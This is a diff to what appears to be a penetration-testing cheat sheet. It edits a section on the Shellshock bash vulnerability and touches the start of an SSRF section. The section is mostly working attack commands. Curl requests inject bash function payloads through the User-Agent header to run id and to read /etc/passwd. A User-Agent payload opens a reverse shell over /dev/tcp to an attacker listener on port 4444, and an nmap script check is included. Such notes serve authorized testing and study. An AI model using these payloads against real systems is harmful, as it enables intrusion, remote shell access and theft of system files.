@@ -135,14 +135,15 @@ Metasploit module or 34900.py ("Apache mod_cgi - 'Shellshock' Remote Command Inj
 Syntax: () { :; }   
 Manual test for CGI based webservers: 
     
-    curl -x http://192.168.90.61:3128 -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" -L http://10.10.10.10/cgi-bin/status
+    curl -x http://192.168.90.61:3128 -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" -L http://10.10.10.10/cgi-bin/status    
+    curl -A "() { ignored;}; echo; /bin/cat /etc/passwd" http://127.0.0.1/cgi-bin/netstat.cgi
+
 Nmap script check:   
 
     nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.10   
 To exploit change vulnerable field in HTTP request (likely UAS) to a reverse shell command:        
     
-    User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1    
-
+    User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1     
 # SSRF   
 Server requests resource of behalf of the web client.    
 SSRF example using curl:    
